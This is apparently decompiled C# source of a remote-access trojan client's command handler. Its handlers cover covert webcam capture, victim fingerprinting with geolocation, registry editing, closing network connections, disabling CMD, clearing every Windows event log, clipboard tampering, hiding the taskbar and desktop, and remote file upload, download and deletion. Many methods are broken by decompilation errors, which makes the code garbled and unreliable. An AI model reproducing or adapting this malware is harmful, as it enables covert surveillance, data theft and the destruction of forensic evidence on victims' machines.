using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;

namespace xClient.Core.Commands;

public static class CommandHandler
{
	public struct MibTcprowOwnerPid
	{
		public uint state;

		public uint localAddr;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] localPort;

		public uint remoteAddr;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] remotePort;

		public uint owningPid;

		public IPAddress LocalAddress => new IPAddress(localAddr);

		public ushort LocalPort => BitConverter.ToUInt16(new byte[2]
		{
			localPort[1],
			localPort[0]
		}, 0);

		public IPAddress RemoteAddress => new IPAddress(remoteAddr);

		public ushort RemotePort => BitConverter.ToUInt16(new byte[2]
		{
			remotePort[1],
			remotePort[0]
		}, 0);
	}

	public struct MibTcptableOwnerPid
	{
		public uint dwNumEntries;

		private readonly MibTcprowOwnerPid table;
	}

	private enum TcpTableClass
	{
		TcpTableBasicListener,
		TcpTableBasicConnections,
		TcpTableBasicAll,
		TcpTableOwnerPidListener,
		TcpTableOwnerPidConnections,
		TcpTableOwnerPidAll,
		TcpTableOwnerModuleListener,
		TcpTableOwnerModuleConnections,
		TcpTableOwnerModuleAll
	}

	public class Taskbar
	{
		private const int SW_HIDE = 0;

		private const int SW_SHOW = 1;

		protected static int Handle => FindWindow("Shell_TrayWnd", "");

		protected static int HandleOfStartButton => FindWindowEx(GetDesktopWindow(), 0, "button", 0);

		[DllImport("user32.dll")]
		private static extern int FindWindow(string className, string windowText);

		[DllImport("user32.dll")]
		private static extern int ShowWindow(int hwnd, int command);

		[DllImport("user32.dll")]
		public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

		[DllImport("user32.dll")]
		private static extern int GetDesktopWindow();

		private Taskbar()
		{
		}

		public static void Show()
		{
			ShowWindow(Handle, 1);
			ShowWindow(HandleOfStartButton, 1);
		}

		public static void Hide()
		{
			ShowWindow(Handle, 0);
			ShowWindow(HandleOfStartButton, 0);
		}
	}

	public class OpenOrCloseCDDrive
	{
		protected const int IntMciSuccess = 0;

		protected const int IntBufferSize = 127;

		[DllImport("winmm.dll", CharSet = CharSet.Auto)]
		public static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

		public static void Open(DriveInfo cdDrive)
		{
			if (cdDrive.DriveType == DriveType.CDRom)
			{
				StringBuilder buffer = new StringBuilder();
				mciSendString($"set CDAudio!{cdDrive.Name} door open", buffer, 127, IntPtr.Zero);
			}
		}

		public static void Close(DriveInfo cdDrive)
		{
			if (cdDrive.DriveType == DriveType.CDRom)
			{
				StringBuilder buffer = new StringBuilder();
				mciSendString($"set CDAudio!{cdDrive.Name} door closed", buffer, 127, IntPtr.Zero);
			}
		}
	}

	public static bool WebcamStarted;

	public static bool NeedsCapture;

	public static _003F Client;

	public static int Webcam;

	public static int Resolution;

	public static VideoCaptureDevice FinalVideo;

	public static _003F StreamCodec;

	private static _003F _shell;

	private static Dictionary<int, string> _renamedFiles = new Dictionary<int, string>();

	private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();

	private const string DELIMITER = "$E$";

	private static readonly Semaphore _limitThreads = new Semaphore(2, 2);

	public static string BotKillDone = "";

	public static _003F HandleGetRegistryKey()
	{
		//Discarded unreachable code: IL_0005, IL_000b, IL_0011, IL_0016, IL_001b, IL_0020, IL_0025, IL_002f, IL_003b, IL_003d, IL_0044, IL_0049, IL_0050
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_0036: Expected O, but got Unknown
		/*Error: Invalid metadata token*/;
	}

	public static _003F HandleCreateRegistryKey()
	{
		//Discarded unreachable code: IL_0005, IL_0017, IL_001c, IL_0021, IL_0029, IL_0031, IL_0038, IL_0045, IL_004a, IL_0051, IL_0056, IL_005d
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	public static _003F HandleDeleteRegistryKey()
	{
		//Discarded unreachable code: IL_0005, IL_0011, IL_0016, IL_001b, IL_0020, IL_0028, IL_0030, IL_0037, IL_003e, IL_0043, IL_004a, IL_004f, IL_0056
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		/*Error: Invalid metadata token*/;
	}

	public static _003F HandleRenameRegistryKey()
	{
		//Discarded unreachable code: IL_0005, IL_0011, IL_0016, IL_001b, IL_0020, IL_0025, IL_002d, IL_0035, IL_003c, IL_0043, IL_0048, IL_004f, IL_0054, IL_005b, IL_0060, IL_0067
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		/*Error: Invalid metadata token*/;
	}

	public static _003F HandleCreateRegistryValue()
	{
		//Discarded unreachable code: IL_0005, IL_0017, IL_001c, IL_0021, IL_0026, IL_002e, IL_0036, IL_003d, IL_0045, IL_004b, IL_0055, IL_005a, IL_0061, IL_0066, IL_006d
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		/*Error: Invalid metadata token*/;
	}

	public static _003F HandleDeleteRegistryValue()
	{
		//Discarded unreachable code: IL_0005, IL_0011, IL_0016, IL_001b, IL_0020, IL_0028, IL_0030, IL_0037, IL_003e, IL_0043, IL_004a, IL_004f, IL_0056
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		/*Error: Invalid metadata token*/;
	}

	public static _003F HandleRenameRegistryValue()
	{
		//Discarded unreachable code: IL_0005, IL_0011, IL_0016, IL_001b, IL_0020, IL_0025, IL_002d, IL_0035, IL_003c, IL_0043, IL_0048, IL_004f, IL_0054, IL_005b, IL_0060, IL_0067
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		/*Error: Invalid metadata token*/;
	}

	public static _003F HandleChangeRegistryValue()
	{
		//Discarded unreachable code: IL_0005, IL_0011, IL_0016, IL_001b, IL_0020, IL_0028, IL_0030, IL_0037, IL_003e, IL_0043, IL_004a, IL_004f, IL_0056
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		/*Error: Invalid metadata token*/;
	}

	public static _003F HandleGetConnections()
	{
		//Discarded unreachable code: IL_0122, IL_0128
		MibTcprowOwnerPid[] table = GetTable();
		string[] array = new string[table.Length];
		string[] array2 = new string[table.Length];
		string[] array3 = new string[table.Length];
		string[] array4 = new string[table.Length];
		string[] array5 = new string[table.Length];
		byte[] array6 = new byte[table.Length];
		for (int i = 0; i < table.Length; i++)
		{
			array2[i] = table[i].LocalAddress.ToString();
			array3[i] = table[i].LocalPort.ToString();
			array4[i] = table[i].RemoteAddress.ToString();
			array5[i] = table[i].RemotePort.ToString();
			array6[i] = Convert.ToByte(table[i].state);
			try
			{
				Process processById = Process.GetProcessById((int)table[i].owningPid);
				array[i] = processById.ProcessName;
			}
			catch
			{
				array[i] = $"PID: {table[i].owningPid}";
			}
		}
		/*Error near IL_011d: Invalid metadata token*/;
	}

	public static _003F HandleDoCloseConnection()
	{
		//Discarded unreachable code: IL_0015, IL_0039, IL_003f, IL_0063, IL_00a7, IL_00bd
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Incompatible stack heights: 0 vs 1
		MibTcprowOwnerPid[] table = GetTable();
		bool flag = false;
		int num = 0;
		if (num < table.Length)
		{
			/*Error near IL_000f: ldarg 1 (out-of-bounds)*/;
			/*Error near IL_0010: Invalid metadata token*/;
		}
		if (flag)
		{
			/*Error near IL_00b7: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_00b8: Invalid metadata token*/;
		}
		return /*Error near IL_00c3: Stack underflow*/;
	}

	public static MibTcprowOwnerPid[] GetTable()
	{
		int ipVersion = 2;
		int dwOutBufLen = 0;
		GetExtendedTcpTable(IntPtr.Zero, ref dwOutBufLen, sort: true, 2, TcpTableClass.TcpTableOwnerPidAll);
		IntPtr intPtr = Marshal.AllocHGlobal(dwOutBufLen);
		try
		{
			if (GetExtendedTcpTable(intPtr, ref dwOutBufLen, sort: true, ipVersion, TcpTableClass.TcpTableOwnerPidAll) != 0)
			{
				return null;
			}
			MibTcptableOwnerPid mibTcptableOwnerPid = (MibTcptableOwnerPid)Marshal.PtrToStructure(intPtr, typeof(MibTcptableOwnerPid));
			IntPtr intPtr2 = (IntPtr)((long)intPtr + Marshal.SizeOf((object)mibTcptableOwnerPid.dwNumEntries));
			MibTcprowOwnerPid[] array = new MibTcprowOwnerPid[mibTcptableOwnerPid.dwNumEntries];
			for (int i = 0; i < mibTcptableOwnerPid.dwNumEntries; i++)
			{
				MibTcprowOwnerPid mibTcprowOwnerPid = (array[i] = (MibTcprowOwnerPid)Marshal.PtrToStructure(intPtr2, typeof(MibTcprowOwnerPid)));
				intPtr2 = (IntPtr)((long)intPtr2 + Marshal.SizeOf((object)mibTcprowOwnerPid));
			}
			return array;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	[DllImport("iphlpapi.dll", SetLastError = true)]
	private static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TcpTableClass tblClass, uint reserved = 0u);

	[DllImport("iphlpapi.dll")]
	private static extern int SetTcpEntry(IntPtr pTcprow);

	public static _003F HandleGetWebcams()
	{
		//Discarded unreachable code: IL_009e
		Dictionary<string, List<Size>> dictionary = new Dictionary<string, List<Size>>();
		foreach (FilterInfo item in new FilterInfoCollection(FilterCategory.VideoInputDevice))
		{
			List<Size> list = new List<Size>();
			VideoCapabilities[] videoCapabilities = new VideoCaptureDevice(item.MonikerString).VideoCapabilities;
			foreach (VideoCapabilities videoCapabilities2 in videoCapabilities)
			{
				list.Add(videoCapabilities2.FrameSize);
			}
			dictionary.Add(item.Name, list);
		}
		if (dictionary.Count > 0)
		{
			/*Error near IL_0099: Invalid metadata token*/;
		}
		return /*Error near IL_00a5: Stack underflow*/;
	}

	public static _003F HandleGetWebcam()
	{
		//Discarded unreachable code: IL_0012, IL_001d, IL_0029, IL_0039, IL_0078, IL_008e
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		Client = /*Error: ldarg 1 (out-of-bounds)*/;
		NeedsCapture = true;
		/*Error near IL_000c: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_000d: Invalid metadata token*/;
	}

	public static _003F HandleDoWebcamStop()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		NeedsCapture = false;
		WebcamStarted = false;
		Client = null;
		if (FinalVideo != null)
		{
			FinalVideo.NewFrame -= FinalVideo_NewFrame;
			FinalVideo.Stop();
			FinalVideo = null;
		}
		return /*Error near IL_0040: Stack underflow*/;
	}

	private static void FinalVideo_NewFrame(object sender, NewFrameEventArgs e)
	{
		//Discarded unreachable code: IL_0050, IL_005a, IL_006c
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		if (!WebcamStarted)
		{
			FinalVideo.Stop();
		}
		if (NeedsCapture)
		{
			Bitmap val = (Bitmap)((Image)e.Frame).Clone();
			using MemoryStream memoryStream = new MemoryStream();
			((Image)val).Save((Stream)memoryStream, ImageFormat.get_Bmp());
			memoryStream.ToArray();
			_ = Webcam;
			_ = Resolution;
			/*Error near IL_004b: Invalid metadata token*/;
		}
	}

	public static _003F HandleGetAuthentication()
	{
		//Discarded unreachable code: IL_005a, IL_0060, IL_0067, IL_007b, IL_0081
		GeoLocationHelper.Initialize();
		_ = Settings.VERSION;
		_ = PlatformHelper.FullName;
		WindowsAccountHelper.GetAccountType();
		_ = GeoLocationHelper.GeoInfo.Country;
		_ = GeoLocationHelper.GeoInfo.CountryCode;
		_ = GeoLocationHelper.GeoInfo.Region;
		_ = GeoLocationHelper.GeoInfo.City;
		_ = GeoLocationHelper.ImageIndex;
		_ = DevicesHelper.HardwareId;
		WindowsAccountHelper.GetName();
		SystemHelper.GetPcName();
		_ = Settings.TAG;
		/*Error near IL_0055: Invalid metadata token*/;
	}

	public static _003F HandleDoClientUpdate()
	{
		//Discarded unreachable code: IL_001f, IL_0029, IL_0039, IL_0040, IL_0050, IL_005f, IL_006f, IL_0080, IL_0082, IL_008d, IL_0094, IL_009f, IL_00a5, IL_00b2, IL_00bd, IL_00c2, IL_00c4, IL_00ca, IL_00d0, IL_00db, IL_00e8, IL_00ea, IL_00fa, IL_0101, IL_0111, IL_0117, IL_0121, IL_012c, IL_0138, IL_014b, IL_0152, IL_0162, IL_0168, IL_016d, IL_0182, IL_018d, IL_018f, IL_0190
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_000d: Expected O, but got Unknown
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_010c: Expected O, but got Unknown
		//IL_0107: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Expected O, but got Unknown
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Expected O, but got Unknown
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_0178: Expected O, but got Unknown
		//IL_0188: Expected O, but got Unknown
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		new _003C_003Ec__DisplayClass34_0();
		/*Error near IL_0005: stloc 0 (out-of-bounds)*/;
		((_003C_003Ec__DisplayClass34_0)/*Error near IL_0006: ldloc 0 (out-of-bounds)*/).client = /*Error near IL_0007: ldarg 1 (out-of-bounds)*/;
		((_003C_003Ec__DisplayClass34_0)/*Error near IL_000d: ldloc 0 (out-of-bounds)*/).command = /*Error near IL_000e: ldarg 0 (out-of-bounds)*/;
		_ = ((_003C_003Ec__DisplayClass34_0)/*Error near IL_0014: ldloc 0 (out-of-bounds)*/).command;
		/*Error near IL_001a: Invalid metadata token*/;
	}

	public static _003F HandleDoClientUninstall()
	{
		//Discarded unreachable code: IL_000a, IL_0010, IL_0016
		/*Error near IL_0005: Invalid metadata token*/;
	}

	public static _003F HandleDoClientRestoreDel()
	{
		//Discarded unreachable code: IL_000a, IL_0010, IL_0055, IL_005f, IL_0065
		/*Error near IL_0005: Invalid metadata token*/;
	}

	public static _003F HandleDoTextToSpeech()
	{
		//Discarded unreachable code: IL_0036, IL_003c
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		_003F command = /*Error near IL_0006: ldarg 0 (out-of-bounds)*/;
		SpeechSynthesizer speechSynthesizerObj = new SpeechSynthesizer();
		new Thread((ThreadStart)delegate
		{
			//Discarded unreachable code: IL_001c
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			speechSynthesizerObj = new SpeechSynthesizer();
			_ = speechSynthesizerObj;
			_ = command;
			/*Error near IL_0017: Invalid metadata token*/;
		}).Start();
		/*Error near IL_0031: Invalid metadata token*/;
	}

	public static _003F HandleDoRunBotkiller()
	{
		//Discarded unreachable code: IL_000a, IL_0010, IL_001f, IL_0025
		/*Error near IL_0005: Invalid metadata token*/;
	}

	public static _003F HandleDoDisableCMD()
	{
		//Discarded unreachable code: IL_0048, IL_004e, IL_0065, IL_006b, IL_0071
		//IL_0006: Expected O, but got Unknown
		try
		{
			_ = ((object)/*Error: ldarg 0 (out-of-bounds)*/).ToString() == "1";
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
			if (registryKey.GetValue("DisableCMD") == null)
			{
				registryKey.SetValue("DisableCMD", "1");
				/*Error near IL_0043: Invalid metadata token*/;
			}
			registryKey.DeleteValue("DisableCMD");
			/*Error near IL_0060: Invalid metadata token*/;
		}
		catch
		{
		}
		return /*Error near IL_0077: Stack underflow*/;
	}

	public static _003F HandleDoWallpaper()
	{
		//Discarded unreachable code: IL_0052, IL_0062, IL_0068
		string text = Path.GetRandomFileName().Replace(".", string.Empty);
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + DateTime.Now.Millisecond;
		/*Error near IL_004c: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_004d: Invalid metadata token*/;
	}

	public static void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void SetWallpaperFromWeb(string url, string path)
	{
		try
		{
			new WebClient().DownloadFile(new Uri(url), path);
			SetWallpaper(path);
		}
		catch
		{
		}
	}

	public static _003F HandleDoHideTaskbar()
	{
		//Discarded unreachable code: IL_0006, IL_0012, IL_0021, IL_0027, IL_002d, IL_0039, IL_0048, IL_004e
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	[DllImport("user32.dll")]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static _003F HandleDoHideDesktop()
	{
		//Discarded unreachable code: IL_0006, IL_0012, IL_0032, IL_0038, IL_003e, IL_004a, IL_006a, IL_0070
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	[DllImport("user32.dll")]
	public static extern int SwapMouseButton(int bSwap);

	public static _003F HandleDoSwapButtons()
	{
		//Discarded unreachable code: IL_0006, IL_0012, IL_0023, IL_0029, IL_002f, IL_003b, IL_004c, IL_0052
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	public static _003F HandleDoCD()
	{
		//Discarded unreachable code: IL_0006, IL_0012, IL_001c, IL_0029, IL_002f, IL_0033, IL_0039, IL_0043, IL_0049, IL_004f, IL_005b, IL_0065, IL_0072, IL_0078, IL_007c, IL_0082, IL_008c, IL_0092
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	public static _003F HandleDoRegedit()
	{
		//Discarded unreachable code: IL_0006, IL_0012, IL_0071, IL_0077, IL_0083, IL_00c6
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	[DllImport("user32.dll")]
	internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

	[DllImport("user32.dll")]
	internal static extern bool CloseClipboard();

	[DllImport("user32.dll")]
	internal static extern bool SetClipboardData(uint uFormat, IntPtr data);

	[STAThread]
	public static _003F HandleDoClearClipboard()
	{
		//Discarded unreachable code: IL_0035, IL_003b
		OpenClipboard(IntPtr.Zero);
		IntPtr intPtr = Marshal.StringToHGlobalUni(string.Empty);
		SetClipboardData(13u, intPtr);
		CloseClipboard();
		Marshal.FreeHGlobal(intPtr);
		/*Error near IL_0030: Invalid metadata token*/;
	}

	public static _003F HandleDoClearEvents()
	{
		//Discarded unreachable code: IL_0027, IL_002c, IL_0034, IL_0039, IL_003b
		try
		{
			EventLog[] eventLogs = EventLog.GetEventLogs();
			foreach (EventLog obj in eventLogs)
			{
				obj.Clear();
				((Component)(object)obj).Dispose();
			}
			/*Error near IL_0022: Invalid metadata token*/;
		}
		catch (Exception)
		{
			/*Error near IL_002f: Invalid metadata token*/;
		}
	}

	public static _003F HandleClipboardSet()
	{
		//Discarded unreachable code: IL_0011, IL_0036, IL_003c
		OpenClipboard(IntPtr.Zero);
		/*Error near IL_000b: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_000c: Invalid metadata token*/;
	}

	public static _003F HandleGetDirectory()
	{
		//Discarded unreachable code: IL_0027, IL_0062, IL_008d, IL_0095, IL_009a, IL_00b2, IL_00bd, IL_00dc, IL_00e4, IL_00e9, IL_00f9, IL_00fe, IL_0103, IL_018b
		bool isError = false;
		string message = null;
		Action<string> action = delegate(string msg)
		{
			isError = true;
			message = msg;
		};
		try
		{
			/*Error near IL_0021: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0022: Invalid metadata token*/;
		}
		catch (UnauthorizedAccessException)
		{
			action("GetDirectory No permission");
		}
		catch (SecurityException)
		{
			action("GetDirectory No permission");
		}
		catch (PathTooLongException)
		{
			action("GetDirectory Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("GetDirectory Directory not found");
		}
		catch (FileNotFoundException)
		{
			action("GetDirectory File not found");
		}
		catch (IOException)
		{
			action("GetDirectory I/O error");
		}
		catch (Exception)
		{
			action("GetDirectory Failed");
		}
		finally
		{
			if (isError && !string.IsNullOrEmpty(message))
			{
				_ = message;
				_ = 1;
				/*Error near IL_0186: Invalid metadata token*/;
			}
		}
		return /*Error near IL_0193: Stack underflow*/;
	}

	public static _003F HandleDoDownloadFile()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		_003F command = /*Error near IL_0006: ldarg 0 (out-of-bounds)*/;
		_003F client = /*Error near IL_000d: ldarg 1 (out-of-bounds)*/;
		new Thread((ThreadStart)delegate
		{
			//Discarded unreachable code: IL_0016, IL_001b, IL_0022, IL_0025, IL_002b, IL_0031, IL_0035, IL_0040, IL_0042, IL_0052, IL_0059, IL_0062, IL_0064, IL_006f, IL_007a, IL_0086, IL_008d, IL_0092, IL_009d, IL_00a1, IL_00a8, IL_00aa, IL_00ac, IL_00b2, IL_00b8, IL_00c6, IL_00d1, IL_00e9, IL_00f4, IL_00f6
			//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Invalid comparison between Unknown and I4
			//IL_0036: Unknown result type (might be due to invalid IL or missing references)
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0065: Unknown result type (might be due to invalid IL or missing references)
			//IL_0070: Unknown result type (might be due to invalid IL or missing references)
			//IL_0093: Unknown result type (might be due to invalid IL or missing references)
			//IL_009f: Unknown result type (might be due to invalid IL or missing references)
			//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e4: Expected O, but got Unknown
			//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
			_limitThreads.WaitOne();
			try
			{
				_ = command;
				/*Error near IL_0011: Invalid metadata token*/;
			}
			catch (Exception)
			{
				/*Error near IL_00ba: stloc 3 (out-of-bounds)*/;
				_ = command;
				/*Error near IL_00c1: Invalid metadata token*/;
			}
		}).Start();
		return /*Error near IL_0029: Stack underflow*/;
	}

	public static _003F HandleDoDownloadFileCancel()
	{
		//Discarded unreachable code: IL_000b, IL_0012, IL_001d, IL_002d, IL_0044, IL_004a
		_ = _canceledDownloads;
		/*Error near IL_0005: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0006: Invalid metadata token*/;
	}

	public static _003F HandleDoUploadFile()
	{
		//Discarded unreachable code: IL_0006, IL_0008, IL_000e, IL_0015, IL_001a, IL_001f, IL_0025, IL_002a, IL_0030, IL_0035, IL_003a
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	public static _003F HandleDoPathDelete()
	{
		//Discarded unreachable code: IL_0027, IL_002b, IL_002f, IL_0035, IL_0046, IL_004c, IL_004e, IL_0054, IL_0064, IL_006a, IL_0070, IL_007a, IL_00e9
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_000d: Expected O, but got Unknown
		//IL_0014: Expected O, but got Unknown
		//IL_0020: Expected O, but got Unknown
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_009c: Expected O, but got Unknown
		//IL_00aa: Expected O, but got Unknown
		//IL_00b8: Expected O, but got Unknown
		//IL_00c6: Expected O, but got Unknown
		//IL_00ce: Expected O, but got Unknown
		//IL_00d6: Expected O, but got Unknown
		//IL_00e3: Expected O, but got Unknown
		new _003C_003Ec__DisplayClass64_0();
		/*Error near IL_0005: stloc 0 (out-of-bounds)*/;
		((_003C_003Ec__DisplayClass64_0)/*Error near IL_0006: ldloc 0 (out-of-bounds)*/).isError = false;
		((_003C_003Ec__DisplayClass64_0)/*Error near IL_000d: ldloc 0 (out-of-bounds)*/).message = null;
		new Action<string>(((_003C_003Ec__DisplayClass64_0)/*Error near IL_0014: ldloc 0 (out-of-bounds)*/)._003CHandleDoPathDelete_003Eb__0);
		/*Error near IL_0020: stloc 1 (out-of-bounds)*/;
		try
		{
			/*Error near IL_0021: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0022: Invalid metadata token*/;
		}
		catch (UnauthorizedAccessException)
		{
			/*Error near IL_0083: ldloc 1 (out-of-bounds)*/("DeletePath No permission");
		}
		catch (PathTooLongException)
		{
			/*Error near IL_0091: ldloc 1 (out-of-bounds)*/("DeletePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			/*Error near IL_009f: ldloc 1 (out-of-bounds)*/("DeletePath Path not found");
		}
		catch (IOException)
		{
			/*Error near IL_00ad: ldloc 1 (out-of-bounds)*/("DeletePath I/O error");
		}
		catch (Exception)
		{
			/*Error near IL_00bb: ldloc 1 (out-of-bounds)*/("DeletePath Failed");
		}
		finally
		{
			if (((_003C_003Ec__DisplayClass64_0)/*Error near IL_00c8: ldloc 0 (out-of-bounds)*/).isError && !string.IsNullOrEmpty(((_003C_003Ec__DisplayClass64_0)/*Error near IL_00d0: ldloc 0 (out-of-bounds)*/).message))
			{
				_ = ((_003C_003Ec__DisplayClass64_0)/*Error near IL_00dd: ldloc 0 (out-of-bounds)*/).message;
				_ = 0;
				/*Error near IL_00e4: Invalid metadata token*/;
			}
		}
		return /*Error near IL_00f1: Stack underflow*/;
	}

	public static _003F HandleDoPathRename()
	{
		//Discarded unreachable code: IL_0027, IL_002b, IL_002f, IL_0035, IL_003b, IL_004b, IL_0051, IL_0053, IL_0059, IL_005f, IL_006f, IL_0075, IL_007b, IL_0085, IL_00f4
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_000d: Expected O, but got Unknown
		//IL_0014: Expected O, but got Unknown
		//IL_0020: Expected O, but got Unknown
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Expected O, but got Unknown
		//IL_00a7: Expected O, but got Unknown
		//IL_00b5: Expected O, but got Unknown
		//IL_00c3: Expected O, but got Unknown
		//IL_00d1: Expected O, but got Unknown
		//IL_00d9: Expected O, but got Unknown
		//IL_00e1: Expected O, but got Unknown
		//IL_00ee: Expected O, but got Unknown
		new _003C_003Ec__DisplayClass65_0();
		/*Error near IL_0005: stloc 0 (out-of-bounds)*/;
		((_003C_003Ec__DisplayClass65_0)/*Error near IL_0006: ldloc 0 (out-of-bounds)*/).isError = false;
		((_003C_003Ec__DisplayClass65_0)/*Error near IL_000d: ldloc 0 (out-of-bounds)*/).message = null;
		new Action<string>(((_003C_003Ec__DisplayClass65_0)/*Error near IL_0014: ldloc 0 (out-of-bounds)*/)._003CHandleDoPathRename_003Eb__0);
		/*Error near IL_0020: stloc 1 (out-of-bounds)*/;
		try
		{
			/*Error near IL_0021: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0022: Invalid metadata token*/;
		}
